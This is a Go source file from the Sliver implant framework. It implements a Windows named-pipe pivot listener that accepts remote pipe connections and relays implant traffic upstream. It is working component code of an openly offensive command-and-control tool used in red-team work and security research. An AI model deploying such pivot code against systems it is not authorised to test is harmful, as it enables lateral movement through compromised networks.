package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/lesnuages/go-winio"
)

// CreateNamedPipePivotListener - Starts a named pipe listener
func CreateNamedPipePivotListener(address string, upstream chan<- *pb.Envelope) (*PivotListener, error) {
	fullName := "\\\\.\\pipe\\" + address
	ln, err := winio.ListenPipe(fullName, &winio.PipeConfig{
		RemoteClientMode: true,
	})
	// {{if .Config.Debug}}
	log.Printf("Listening on %s", fullName)
	// {{end}}
	if err != nil {
		return nil, err
	}
	pivotLn := &PivotListener{
		ID:               ListenerID(),
		Type:             pb.PivotType_NamedPipe,
		Listener:         ln,
		PivotConnections: &sync.Map{},
		BindAddress:      fullName,
		Upstream:         upstream,
	}
	go namedPipeAcceptConnections(pivotLn)
	return pivotLn, nil
}

func namedPipeAcceptConnections(pivotListener *PivotListener) {
	// hostname, err := os.Hostname()
	// if err != nil {
	// 	// {{if .Config.Debug}}
	// 	log.Printf("Failed to determine hostname %s", err)
	// 	// {{end}}
	// 	hostname = "."
	// }
	// namedPipe := strings.ReplaceAll(pivotListener.Listener.Addr().String(), ".", hostname)
	for {
		conn, err := pivotListener.Listener.Accept()
		if err != nil {
			continue
		}
		// handle connection like any other net.Conn
		pivotConn := &NetConnPivot{
			conn:          conn,
			readMutex:     &sync.Mutex{},
			writeMutex:    &sync.Mutex{},
			readDeadline:  tcpPivotReadDeadline,
			writeDeadline: tcpPivotWriteDeadline,
			upstream:      pivotListener.Upstream,
			Downstream:    make(chan *pb.Envelope),
		}
		go pivotConn.Start(pivotListener.PivotConnections)
	}
}
